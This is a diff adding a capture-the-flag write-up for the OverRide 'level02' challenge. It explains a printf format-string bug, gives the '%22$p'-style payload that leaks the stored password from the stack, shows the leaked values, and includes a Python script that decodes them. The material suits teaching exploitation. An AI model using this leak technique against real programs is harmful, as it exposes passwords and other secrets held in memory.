@@ -1,0 +1,50 @@
+scp -P 2223 level02@localhost:level02 /home/ncardozo/Documents/OverRide
+
+strings level02
+
+fopen
+fclose
+strncmp
+system + /bin/sh
+Greetings, %s!
+
+Found in decompiler :
+
+  if ( strncmp(ptr, s2, 0x29u) != 0 )
+  {
+    printf(s);
+    puts(" does not have access!");
+    exit(1);
+  }
+  printf("Greetings, %s!\n", s);
+  system("/bin/sh");
+
+So we can see that there is a vunerable printf and the program waits a password.
+We'll print a lot of chars so printf will be dumped and will print us the password
+
+objdump -d level02 | less
+
+in main we see fread (funciton that reads .pass) 
+and after we have rbp address (registre that contains .pass)
+
+  400909:       48 8d 85 60 ff ff ff    lea    -0xa0(%rbp),%rax
+
+After checking 0xa0 position in the register we found that is 22 so:
+
+(python -c 'print "%22$p|%23$p|%24$p|%25$p|%26$p|%27$p"'; echo aaa) | ./level02
+
+We have this in return
+--[ Username: --[ Password: *****************************************
+0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil) does not have access!
+
+To transform it :
+
+python -c '
+vals = [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]
+out = ""
+for v in vals:
+    out += ("%016x" % v).decode("hex")[::-1]
+print out
+'
+
+Enter
